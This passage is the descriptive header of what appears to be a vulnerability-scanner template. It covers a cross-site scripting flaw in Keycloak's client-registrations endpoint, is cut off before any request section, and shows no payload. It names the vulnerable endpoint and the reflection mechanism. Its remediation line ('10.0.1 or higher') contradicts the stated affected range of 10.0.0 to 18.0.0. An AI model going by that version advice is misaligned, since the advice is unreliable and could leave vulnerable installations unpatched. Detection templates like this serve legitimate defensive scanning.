id: CVE-2021-20323
info:
  name: Keycloak 10.0.0 - 18.0.0 - Cross-Site Scripting
  author: ndmalc,incogbyte
  description: 'Keycloak 10.0.0 to 18.0.0 contains a cross-site scripting vulnerability
    via the client-registrations endpoint. On a POST request, the application does
    not sanitize an unknown attribute name before including it in the error response
    with a ''Content-Type'' of text/hml. Once reflected, the response is interpreted
    as HTML. This can be performed on any realm present on the Keycloak instance.
    Since the bug requires Content-Type application/json and is submitted via a POST,
    there is no common path to exploit that has a user impact.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Upgrade Keycloak to a version that is not affected by the vulnerability
    (10.0.1 or higher).
